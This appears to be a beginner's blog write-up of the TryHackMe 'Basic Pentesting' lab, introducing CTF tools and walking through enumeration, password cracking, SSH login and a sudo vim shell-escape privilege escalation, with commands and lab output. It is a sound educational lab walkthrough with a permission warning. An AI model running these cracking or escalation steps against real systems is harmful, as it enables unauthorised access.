🚩 CTF TryHackMe Beginner

Getting Started with CTF Challenges — Tools, Mindset & First Wins

✍️ Idra Mkumbanya · 📅 June 2025 · 📖 ~8 min read

When I first heard "Capture the Flag" in a cybersecurity context I thought it sounded like a game — and honestly, it is. But it's also one of the best ways to build real, practical security skills. This is my honest account of diving in for the first time: what I used, what confused me, and what finally clicked.

What is a CTF?

A Capture the Flag (CTF) competition is a cybersecurity challenge where you solve puzzles to find hidden strings of text called flags — usually in the format FLAG{some_secret_here}. Each flag you find earns points. The challenges test skills across categories like:

  • Web exploitation — finding vulnerabilities in websites
  • Cryptography — decoding ciphers and breaking weak encryption
  • Forensics — recovering hidden data from files or network captures
  • Binary exploitation — attacking compiled programs
  • OSINT — finding information from public sources

For beginners, platforms like TryHackMe are ideal because they guide you step by step rather than dropping you into a competition cold.

💡
TryHackMe vs HackTheBox
TryHackMe is more beginner-friendly with guided rooms and hints. HackTheBox is more realistic and harder — no hints, closer to real penetration testing. Start with TryHackMe.

Tools I Use

You don't need a lot to start. Here's my basic toolkit:

🐧 Linux (Kali or Ubuntu)

Most security tools are Linux-first. Kali Linux comes with everything pre-installed. If you prefer Ubuntu, you can install tools as you need them.

🔍 Nmap

Network scanner. The first thing I run on any CTF machine to find open ports and services.

nmap -sV -sC -oN scan.txt <IP>
🌐 Burp Suite

Web proxy for intercepting and modifying HTTP requests. Essential for web challenges. The Community edition is free.

🔑 John the Ripper

Password hash cracker. When you find a hash file on a machine, this cracks it using wordlists.

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
📡 Gobuster

Directory brute-forcer for web challenges. Finds hidden paths on websites.

gobuster dir -u http://<IP> -w common.txt
🐍 Python

For writing quick scripts — decoding base64, automating requests, solving crypto challenges.

My First TryHackMe Room

The first room I completed was "Basic Pentesting". Here's the rough process I followed — this is a typical CTF workflow you'll repeat on most machines:

1

Enumeration — find what's open

Run Nmap to see what ports are open. I found SSH (22) and a web server (80) running.

bash
nmap -sV -sC -p- 10.10.x.x

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2
80/tcp open  http    Apache 2.4.18
2

Web enumeration — find hidden directories

The website looked simple. I used Gobuster to find hidden paths.

bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt

/development  (Status: 301)
/secret       (Status: 200)

The /development folder had a note file with a username hint.

3

Cracking credentials

Found a hash file. Used John the Ripper with the rockyou wordlist.

bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt)
password123      (jan)
4

SSH in and find the flag

Login with the cracked credentials, then look for the flag file.

bash
ssh jan@10.10.x.x
# password: password123

ls /home
cat /home/kay/flag.txt

FLAG{y0u_g0t_it_congrats}
5

Privilege escalation

The second flag needed root. I checked sudo permissions:

bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim

# Escape to shell from vim:
sudo vim -c ':!/bin/bash'
whoami
# root
⚠️
Only practice on machines you own or have permission to test.
TryHackMe, HackTheBox, and VulnHub provide legal practice environments. Never run these techniques on real systems without written permission — it is illegal.

The Mindset Shift

The biggest thing CTFs taught me wasn't a specific tool — it was a way of thinking:

  • Enumerate before you attack. Never guess. Map everything first.
  • Read error messages carefully. They often tell you exactly what's wrong — and what's vulnerable.
  • Google is a skill. Searching for a specific CVE number or error string is legitimate and expected.
  • Take notes. Write down every command you run and every output you get. You'll need to backtrack.
  • It's supposed to be hard. Staring at a challenge for 2 hours then suddenly solving it is the whole point.

Good Rooms to Start With on TryHackMe

In rough order of difficulty:

  1. Linux Fundamentals (Parts 1–3) — essential before anything else
  2. Introductory Networking — TCP/IP, OSI model basics
  3. Basic Pentesting — the room I walked through above
  4. OWASP Top 10 — web vulnerabilities one by one
  5. Mr. Robot CTF — themed after the show, great intermediate challenge
